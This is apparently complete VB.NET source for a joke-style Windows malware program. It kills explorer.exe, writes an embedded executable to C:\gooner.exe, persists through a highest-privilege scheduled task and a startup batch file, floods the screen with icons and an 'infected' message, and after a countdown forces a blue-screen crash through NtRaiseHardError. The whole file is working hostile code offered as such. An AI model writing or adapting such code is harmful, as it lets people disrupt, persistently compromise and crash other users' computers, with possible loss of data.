Imports System.IO
Imports System.Media
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Timers

Module Module1
    <DllImport("user32.dll", SetLastError:=True)>
    Private Function GetDC(ByVal hWnd As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Function ReleaseDC(ByVal hWnd As IntPtr, ByVal hDC As IntPtr) As Integer
    End Function

    <DllImport("gdi32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Function TextOut(ByVal hdc As IntPtr, ByVal x As Integer, ByVal y As Integer, ByVal lpString As String, ByVal c As Integer) As Boolean
    End Function

    <DllImport("gdi32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Function CreateFont(ByVal nHeight As Integer, ByVal nWidth As Integer, ByVal nEscapement As Integer, ByVal nOrientation As Integer,
                                ByVal fnWeight As Integer, ByVal fdwItalic As UInteger, ByVal fdwUnderline As UInteger, ByVal fdwStrikeOut As UInteger,
                                ByVal fdwCharSet As UInteger, ByVal fdwOutputPrecision As UInteger, ByVal fdwClipPrecision As UInteger,
                                ByVal fdwQuality As UInteger, ByVal fdwPitchAndFamily As UInteger, ByVal lpszFace As String) As IntPtr
    End Function

    <DllImport("gdi32.dll", SetLastError:=True)>
    Private Function SelectObject(ByVal hdc As IntPtr, ByVal h As IntPtr) As IntPtr
    End Function

    <DllImport("gdi32.dll", SetLastError:=True)>
    Private Function DeleteObject(ByVal hObject As IntPtr) As Boolean
    End Function

    Dim STextGDI As New System.Timers.Timer()
    Dim CrashTIMER As New System.Timers.Timer()
    Dim CrashI As Integer = 60
    Dim Errors As New System.Timers.Timer()

    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Function RtlAdjustPrivilege(ByVal Privilege As UInteger,
                                           ByVal Enable As UInteger,
                                           ByVal CurrentThread As UInteger,
                                           ByRef Enabled As Integer) As Integer
    End Function

    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Function NtRaiseHardError(ByVal ErrorStatus As UInteger,
                                         ByVal NumberOfParameters As UInteger,
                                         ByVal UnicodeStringParameterMask As IntPtr,
                                         ByVal Parameters As IntPtr,
                                         ByVal ValidResponseOption As UInteger,
                                         ByRef Response As UInteger) As Integer
    End Function

    Private Declare Function LoadIcon Lib "user32.dll" Alias "LoadIconA" (ByVal hInstance As IntPtr, ByVal lpIconName As IntPtr) As IntPtr
    Private Declare Function DrawIcon Lib "user32.dll" (ByVal hdc As IntPtr, ByVal x As Integer, ByVal y As Integer, ByVal hIcon As IntPtr) As Boolean
    Private Declare Function SetProcessDPIAware Lib "user32.dll" () As Boolean
    Private Declare Function GetSystemMetrics Lib "user32.dll" (ByVal nIndex As Integer) As Integer

    Private ReadOnly IconIDs As Integer() = {32513, 32514, 32515, 32516, 32517}

    Dim hdc As IntPtr
    Dim w, h As Integer

    Private player As New SoundPlayer()

    Private Function GetRandomIconID() As Integer
        Dim rand As New Random()
        Dim index As Integer = rand.Next(0, IconIDs.Length)
        Return IconIDs(index)
    End Function

    Public Sub DrawTextOnScreen(ByVal text As String, ByVal x As Integer, ByVal y As Integer, ByVal fontSize As Integer)
        Dim hdc As IntPtr = GetDC(IntPtr.Zero)
        If hdc = IntPtr.Zero Then
            Console.WriteLine("Failed to get device context.")
            Return
        End If

        Dim hFont As IntPtr = CreateFont(fontSize, 0, 0, 0, 700, 0, 0, 0, 1, 0, 0, 0, 0, "Arial")
        If hFont = IntPtr.Zero Then
            Console.WriteLine("Failed to create font.")
            ReleaseDC(IntPtr.Zero, hdc)
            Return
        End If

        Dim hOldFont As IntPtr = SelectObject(hdc, hFont)
        If hOldFont = IntPtr.Zero Then
            Console.WriteLine("Failed to select font.")
            DeleteObject(hFont)
            ReleaseDC(IntPtr.Zero, hdc)
            Return
        End If

        Dim success As Boolean = TextOut(hdc, x, y, text, text.Length)
        If Not success Then
            Console.WriteLine("Failed to draw text.")
        End If

        SelectObject(hdc, hOldFont)
        DeleteObject(hFont)
        ReleaseDC(IntPtr.Zero, hdc)
    End Sub

    Sub TerminateProcess(processName As String)
        Try
            Dim processInfo As New ProcessStartInfo() With {
                .FileName = "cmd.exe",
                .Arguments = $"/c taskkill /f /im {processName}",
                .UseShellExecute = False,
                .CreateNoWindow = True
            }
            Process.Start(processInfo)
        Catch ex As Exception
            Console.WriteLine($"Error terminating process: {ex.Message}")
        End Try
    End Sub

    Private Sub RunCommand(command As String)
        Dim processInfo As New ProcessStartInfo("cmd.exe", "/c " & command)
        processInfo.CreateNoWindow = True
        processInfo.UseShellExecute = False
        processInfo.RedirectStandardError = True
        processInfo.RedirectStandardOutput = True

        Dim process As Process = Process.Start(processInfo)
        process.WaitForExit()

        Dim output As String = process.StandardOutput.ReadToEnd()
        Dim [error] As String = process.StandardError.ReadToEnd()

        If process.ExitCode <> 0 Then
            Throw New Exception("Command failed: " & command & vbCrLf & [error])
        End If
    End Sub

    Sub init()
        TerminateProcess("explorer.exe")
        Dim programPath As String = "C:\gooner.exe"

        ' Write the executable file to disk
        File.WriteAllBytes(programPath, My.Resources.Gooner1)

        ' Create a new process start info object to create the scheduled task
        Dim startInfo As New ProcessStartInfo()
        startInfo.FileName = "schtasks"
        startInfo.Arguments = $"/create /tn ""Run"" /tr ""{programPath}"" /sc once /st 00:00 /rl HIGHEST /f"
        startInfo.UseShellExecute = False
        startInfo.RedirectStandardOutput = True
        startInfo.RedirectStandardError = True

        ' Start the process to create the scheduled task
        Using process As Process = Process.Start(startInfo)
            Dim output As String = process.StandardOutput.ReadToEnd()
            Dim [error] As String = process.StandardError.ReadToEnd()

            ' Wait for the process to exit
            process.WaitForExit()

            ' Check if task creation was successful
            If process.ExitCode = 0 Then
                ' Create the batch file to run the scheduled task
                Dim batchFilePath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "RunMBR.bat")
                Dim batchContent As String = "schtasks /run /tn ""Run"""
                File.WriteAllText(batchFilePath, batchContent)
            Else
                ' Output errors if task creation failed
                Console.WriteLine("Error creating scheduled task: " & [error])
            End If
        End Using
        SetProcessDPIAware()
        w = GetSystemMetrics(0)
        h = GetSystemMetrics(1)
        hdc = GetDC(IntPtr.Zero)
        Errors.Interval = 25
        AddHandler Errors.Elapsed, AddressOf errorsGDI
        Errors.AutoReset = True
        Errors.Enabled = True
        music()
    End Sub

    Sub Main()
        init()
        STextGDI.Interval = 100
        AddHandler STextGDI.Elapsed, AddressOf SText
        STextGDI.AutoReset = True
        STextGDI.Enabled = True

        CrashTIMER.Interval = 1000
        AddHandler CrashTIMER.Elapsed, AddressOf Crash
        CrashTIMER.AutoReset = True
        CrashTIMER.Enabled = True

        Threading.Thread.Sleep(Timeout.Infinite)
    End Sub

    Sub music()
        Dim audio As New SoundPlayer
        audio.Stream = My.Resources.music
        audio.Load()
        audio.Play()
    End Sub

    Sub errorsGDI()
        Dim rnd As New Random()
        Dim x As Integer = rnd.Next(0, w)
        Dim y As Integer = rnd.Next(0, h)
        DrawIcon(hdc, x, y, LoadIcon(IntPtr.Zero, New IntPtr(GetRandomIconID())))
    End Sub

    Sub SText(source As Object, e As ElapsedEventArgs)
        DrawTextOnScreen("Sup, your PC is infected with g00nerm4lw4re", 100, 100, 40)
        If CrashI <= 0 Then
            BSOD()
        End If
    End Sub

    Sub Crash(source As Object, e As ElapsedEventArgs)
        CrashI -= 1
        If CrashI >= 0 Then
            DrawTextOnScreen($"BSOD in: {CrashI}", 100, 150, 20)
        End If
    End Sub

    Sub BSOD()
        Dim nullptr As IntPtr = IntPtr.Zero
        Dim enabled As Integer = 0
        Dim response As UInteger = 0

        RtlAdjustPrivilege(19, 1, 0, enabled)
        NtRaiseHardError(&HC000007BUI, 0, nullptr, nullptr, 6, response)
    End Sub
End Module
